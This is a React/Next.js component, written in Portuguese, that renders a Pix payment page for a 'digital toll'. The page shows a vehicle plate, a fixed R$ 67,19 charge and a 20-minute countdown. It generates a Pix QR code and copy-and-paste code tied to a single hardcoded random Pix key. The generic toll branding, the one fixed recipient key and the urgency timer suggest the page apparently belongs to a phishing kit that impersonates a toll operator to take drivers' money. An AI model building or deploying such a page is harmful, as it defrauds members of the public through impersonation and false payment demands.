'use client'

import { useState, useEffect } from 'react'
import { QRCodeSVG } from 'qrcode.react'
import { PageHeader } from '@/components/page-header'
import { Ubuntu } from 'next/font/google'

const ubuntu = Ubuntu({
  subsets: ['latin'],
  weight: ['400', '500', '700'],
})


const CHAVE_PIX_PAINEL = "d5230cce-902a-4e8c-81be-fdd0a658e817" 

function gerarCopiaEColaReal(chave: string): string {
  const merchantAccount = `0014BR.GOV.BCB.PIX01${chave.length.toString().padStart(2, '0')}${chave}`;
  const payloadFormat = "000201";
  const merchantCategory = "52040000";
  const currency = "5303986";
  const amount = "540567.19"; 
  const countryCode = "5802BR";
  const merchantName = "5915PEDAGIO DIGITAL";
  const merchantCity = "6009SAO PAULO";
  const txId = "62070503***";
  
  const concatData = `${payloadFormat}26${merchantAccount.length}${merchantAccount}${merchantCategory}${currency}${amount}${countryCode}${merchantName}${merchantCity}${txId}6304`;
  
  let crc = 0xFFFF;
  for (let i = 0; i < concatData.length; i++) {
    crc ^= concatData.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      if ((crc & 0x8000) !== 0) {
        crc = (crc << 1) ^ 0x1021;
      } else {
        crc <<= 1;
      }
    }
  }
  const crcString = (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
  return `${concatData}${crcString}`;
}

export function PixClient({ placa }: { placa: string }) {
  const [copiado, setCopiado] = useState(false)
  
  
  const [horarioVencimento, setHorarioVencimento] = useState('')
  
 
  const [segundosRestantes, setSegundosRestantes] = useState(1200)
  
  const pixCopiaEColaReal = gerarCopiaEColaReal(CHAVE_PIX_PAINEL)

  useEffect(() => {
 
    const agora = new Date()
    agora.setMinutes(agora.getMinutes() + 20)
    const horas = String(agora.getHours()).padStart(2, '0')
    const minutos = String(agora.getMinutes()).padStart(2, '0')
    setHorarioVencimento(`${horas}:${minutos}`)

   
    const cronometro = setInterval(() => {
      setSegundosRestantes((prev) => {
        if (prev <= 1) {
          clearInterval(cronometro)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(cronometro)
  }, [])

 
  function formatarCronometro(segundosTotais: number): string {
    const minutos = Math.floor(segundosTotais / 60)
    const segundos = segundosTotais % 60
    return `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`
  }

  async function copiar() {
    try {
      await navigator.clipboard.writeText(pixCopiaEColaReal)
      setCopiado(true)
      setTimeout(() => setCopiado(false), 2500)
    } catch {
      setCopiado(false)
    }
  }

  return (
    <div className={`${ubuntu.className} min-h-screen bg-[#f4f5f8] pb-12 text-left select-none`}>
     <PageHeader title="Pagamento" showBack={false} showHome />

      <div className="mx-auto max-w-[560px] px-5 pt-8">
        
        
        <div className="rounded-2xl bg-white p-6 shadow-sm border border-neutral-100">
          <h2 className="text-xl font-bold text-neutral-900 tracking-tight">
            Resumo do pedido
          </h2>

          <div className="mt-5 flex items-center justify-between border-b border-neutral-100 pb-4">
            <span className="text-neutral-400 font-medium text-[14px]">Placa do veículo</span>
            <span className="font-bold text-neutral-900 text-[15px] tracking-wide">{placa}</span>
          </div>
          <div className="mt-4 flex items-center justify-between border-b border-neutral-100 pb-4">
            <span className="text-neutral-400 font-medium text-[14px]">Vencimento código Pix</span>
           
            <span className="font-bold text-neutral-900 text-[15px]">
              {horarioVencimento || '--:--'}
            </span>
          </div>

          <div className="mt-4 flex items-center justify-between rounded-xl bg-[#e5ff51]/20 px-4 py-3.5 border border-[#e5ff51]/30">
            <span className="font-bold text-neutral-800 text-[14px]">Valor do pedido</span>
            <span className="text-lg font-black text-neutral-900">R$ 67,19</span>
          </div>
        </div>

       
        <p className="mt-8 text-center text-sm text-neutral-400 font-medium">
          Pague em até: <span className="font-bold text-neutral-800 text-base ml-1 tabular-nums">{formatarCronometro(segundosRestantes)}</span>
        </p>

        <div className="mt-4 flex justify-center">
          <div className="rounded-xl bg-white p-4 shadow-sm border border-neutral-100">
            <QRCodeSVG value={pixCopiaEColaReal} size={180} level="M" />
          </div>
        </div>

        <p className="mt-6 text-center text-sm text-neutral-400 font-normal px-4 leading-relaxed">
          Copie o código Pix e realize o pagamento no app do seu banco ou
          carteira digital
        </p>

     
        <div className="mt-4 rounded-xl bg-white p-5 shadow-sm border border-neutral-100 select-all">
          <p className="break-all font-mono text-[12px] leading-relaxed text-neutral-400 font-medium">
            {pixCopiaEColaReal}
          </p>
        </div>

        
        <button
          onClick={copiar}
          className="mt-6 w-full rounded-xl bg-black py-4 text-base font-bold text-[#e5ff51] transition-colors hover:bg-neutral-900 focus:outline-none"
        >
          {copiado ? 'Código copiado!' : 'Copiar código Pix'}
        </button>

      </div>
    </div>
  )
}
